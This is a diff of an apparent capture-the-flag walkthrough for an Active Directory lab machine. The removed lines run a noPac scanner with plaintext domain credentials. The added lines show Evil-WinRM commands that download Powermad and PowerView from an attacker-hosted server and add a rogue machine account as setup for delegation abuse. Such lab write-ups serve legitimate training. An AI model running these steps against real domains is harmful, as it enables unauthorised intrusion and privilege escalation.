@@ -1289,22 +1289,27 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 ```
 
+Bloodhound pic:
+
 ```
- sudo python3 scanner.py support/support:Ironside47pleasure40Watchful -dc-ip 10.129.50.211 -use-ldap
-[sudo] password for kali: 
+ (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8000/Powermad.ps1','C:\Users\support\Documents\Powermad.ps1')
+```
 
-███    ██  ██████  ██████   █████   ██████ 
-████   ██ ██    ██ ██   ██ ██   ██ ██      
-██ ██  ██ ██    ██ ██████  ███████ ██      
-██  ██ ██ ██    ██ ██      ██   ██ ██      
-██   ████  ██████  ██      ██   ██  ██████ 
-                                           
-                                        
-    
-[*] Current ms-DS-MachineAccountQuota = 10
-[*] Got TGT with PAC from 10.129.50.211. Ticket size 1544
-[*] Got TGT from 10.129.50.211. Ticket size 1544
+```
+*Evil-WinRM* PS C:\Users\support\Documents> import-module .\powermad.ps1
+```
 
+```
+*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+[+] Machine account attackersystem added
+```
+
+```
+*Evil-WinRM* PS C:\Users\support\Documents> (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8000/PowerView.ps1','C:\Users\support\Documents\PowerView.ps1')
+```
+
+```
+*Evil-WinRM* PS C:\Users\support\Documents> import-module .\powerview.ps1
 ```
 
 ### Exploitation
